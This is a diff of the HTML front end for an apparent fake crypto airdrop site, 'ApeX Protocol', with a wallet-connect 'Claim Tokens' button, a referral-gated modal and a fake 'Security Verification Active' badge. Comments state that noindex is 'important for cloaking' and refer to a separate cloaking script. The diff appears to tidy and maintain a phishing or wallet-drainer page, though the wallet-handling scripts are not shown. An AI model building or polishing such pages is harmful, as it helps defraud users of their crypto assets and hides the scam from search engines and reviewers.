@@ -5,28 +5,34 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <meta name="apple-mobile-web-app-capable" content="yes" />
     <meta name="mobile-web-app-capable" content="yes" />
-    <meta name="robots" content="noindex, nofollow" /> <!-- Prevent indexing -->
-    
+    <!-- Prevent search engines from indexing this page (important for cloaking) -->
+    <meta name="robots" content="noindex, nofollow" />
+    <!-- Force no caching to ensure fresh content every time -->
+    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
+    <meta http-equiv="Pragma" content="no-cache" />
+    <meta http-equiv="Expires" content="0" />
+
     <title>ApeX Protocol | AI-Optimized Yield Farming</title>
-    
+
+    <!-- Preload critical assets for better performance -->
+    <link rel="preload" href="NFT_IMAGE/ChatGPT Image Nov 7, 2025, 10_47_13 AM.png" as="image" />
+    <link rel="preconnect" href="https://cdnjs.cloudflare.com" />
+
     <!-- Stylesheets -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
     <link rel="stylesheet" href="style.css" />
-    
-    <!-- Core libraries - Loaded in optimal order -->
-    <script src="https://cdn.jsdelivr.net/npm/three@0.132.2/build/three.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/vanta@0.5.21/dist/vanta.net.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
-    
-    <!-- Web3 libraries - Only load if needed -->
-    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/web3@1.8.0/dist/web3.min.js"></script>
-    
-    <!-- Preload critical assets -->
-    <link rel="preload" href="NFT_IMAGE/ChatGPT Image Nov 7, 2025, 10_47_13 AM.png" as="image" />
+
+    <!-- Core libraries (loaded with defer to not block rendering) -->
+    <script src="https://cdn.jsdelivr.net/npm/three@0.132.2/build/three.min.js" defer></script>
+    <script src="https://cdn.jsdelivr.net/npm/vanta@0.5.21/dist/vanta.net.min.js" defer></script>
+    <script src="https://cdn.jsdelivr.net/npm/chart.js" defer></script>
+
+    <!-- Web3 libraries – load only if needed, defer execution -->
+    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.min.js" defer></script>
+    <script src="https://cdn.jsdelivr.net/npm/web3@1.8.0/dist/web3.min.js" defer></script>
 </head>
 <body>
-    <!-- Vanta.js Background -->
+    <!-- Vanta.js Background (container for the animated net) -->
     <div id="vanta-bg"></div>
 
     <!-- Announcement Modal (Referral Required) -->
@@ -40,7 +46,7 @@
             </div>
             <h2>Referral Required</h2>
             <p>To claim your airdrop, you need to refer 3 friends to join ApeX Protocol.</p>
-            
+
             <div class="referral-steps">
                 <div class="referral-step">
                     <div class="step-number">1</div>
@@ -55,21 +61,21 @@
                     <div>Claim your 500 APEX tokens</div>
                 </div>
             </div>
-            
+
             <div class="referral-link-container">
                 <div class="referral-link" id="referralLink">https://apex-protocol.io/ref?user=0x8a3F...Bc92</div>
                 <button class="copy-btn" id="copyReferralBtn">
                     <i class="fas fa-copy"></i> Copy Link
                 </button>
             </div>
-            
+
             <button class="btn-primary" id="announcementOkBtn">
                 <i class="fas fa-check"></i> I Understand
             </button>
         </div>
     </div>
 
-    <!-- Security Shield Indicator -->
+    <!-- Security Shield Indicator (always visible) -->
     <div class="security-shield">
         <i class="fas fa-shield-alt"></i> Security Verification Active
     </div>
@@ -108,15 +114,15 @@
                 <h1 class="fade-in">Claim Your <span class="accent-text">AI-Optimized Tokens</span></h1>
                 <p class="fade-in">
                     AI-enhanced token distribution! Get your free APEX tokens with
-                    predictive analytics and smart allocation. 
+                    predictive analytics and smart allocation.
                 </p>
 
-                <!-- Claim Container (Two Cards Side by Side) -->
+                <!-- Two‑card layout -->
                 <div class="claim-container">
                     <!-- Left Card: Claim Form -->
                     <div class="claim-card fade-in">
                         <h2>ApeX Token Claim</h2>
-                        
+
                         <!-- Token Header with Price -->
                         <div class="token-header">
                             <div class="token-logo">AX</div>
@@ -172,16 +178,16 @@
                         <div class="claim-actions">
                             <!-- AppKit button (if using) -->
                             <w3m-button></w3m-button>
-                            
+
                             <!-- Main Claim Button -->
                             <button class="btn-primary" id="connectButton">
                                 <i class="fas fa-hand-holding-heart"></i> Claim Tokens
                             </button>
-                            
+
                             <!-- Status Messages -->
                             <div id="claimStatus" class="status"></div>
-                            
-                            <!-- Debug Panel (Hidden by default) -->
+
+                            <!-- Debug Panel (hidden by default) -->
                             <div class="connection-debug" id="connectionDebug"></div>
                             <span class="debug-toggle" id="debugToggle">Show connection details</span>
                         </div>
@@ -190,7 +196,7 @@
                     <!-- Right Card: Token Tracker -->
                     <div class="token-tracker-card fade-in">
                         <h2>ApeX Token Tracker</h2>
-                        
+
                         <!-- Token Statistics -->
                         <div class="token-stats">
                             <div class="stat-item">
@@ -233,7 +239,7 @@
                 <!-- AI Security Analytics Section -->
                 <div class="ai-section fade-in">
                     <h2><i class="fas fa-brain"></i> AI Security Analytics</h2>
-                    
+
                     <!-- AI Stats Grid -->
                     <div class="ai-stats">
                         <div class="ai-stat">
@@ -303,7 +309,6 @@
                             <li><a href="#"><i class="fas fa-video"></i> Tutorials</a></li>
                         </ul>
                     </div>
-
                     <div class="footer-column">
                         <h3>Company</h3>
                         <ul>
@@ -312,7 +317,6 @@
                             <li><a href="#"><i class="fas fa-handshake"></i> Partners</a></li>
                         </ul>
                     </div>
-
                     <div class="footer-column">
                         <h3>Legal</h3>
                         <ul>
@@ -336,17 +340,18 @@
         </div>
     </footer>
 
-    <!-- JavaScript Modules - Order matters -->
-    <!-- 1. Core utilities first -->
-    <!-- 2. Main application logic -->
-    <!-- 3. NO CLOAKING SCRIPT HERE - it belongs only on entry.html -->
-    <script type="module" src="./Java/Script.js"></script>
-    <script type="module" src="./Java/main.js"></script>
-    
-    <!-- Inline initialization for Vanta (runs after DOM loads) -->
+    <!-- JavaScript Modules – load after DOM is ready -->
+    <script type="module" src="./Java/Script.js" defer></script>
+    <script type="module" src="./Java/main.js" defer></script>
+
+    <!-- Inline Vanta initialization (runs after all deferred scripts) -->
     <script>
-        // Initialize Vanta background when DOM is ready
-        document.addEventListener('DOMContentLoaded', function() {
+        (function initVanta() {
+            // Wait for DOM and required libraries
+            if (document.readyState === 'loading') {
+                document.addEventListener('DOMContentLoaded', initVanta);
+                return;
+            }
             if (typeof VANTA !== 'undefined' && VANTA.NET) {
                 VANTA.NET({
                     el: "#vanta-bg",
@@ -363,8 +368,18 @@
                     maxDistance: 25.00,
                     spacing: 18.00
                 });
+            } else {
+                // Retry after a short delay (libraries may still be loading)
+                setTimeout(initVanta, 200);
             }
-        });
+        })();
     </script>
+
+    <!-- Fallback for users with JavaScript disabled -->
+    <noscript>
+        <div style="position: fixed; top: 0; left: 0; width: 100%; background: #ff0000; color: white; text-align: center; padding: 10px; z-index: 9999;">
+            JavaScript is required to use this site. Please enable JavaScript in your browser settings.
+        </div>
+    </noscript>
 </body>
 </html>
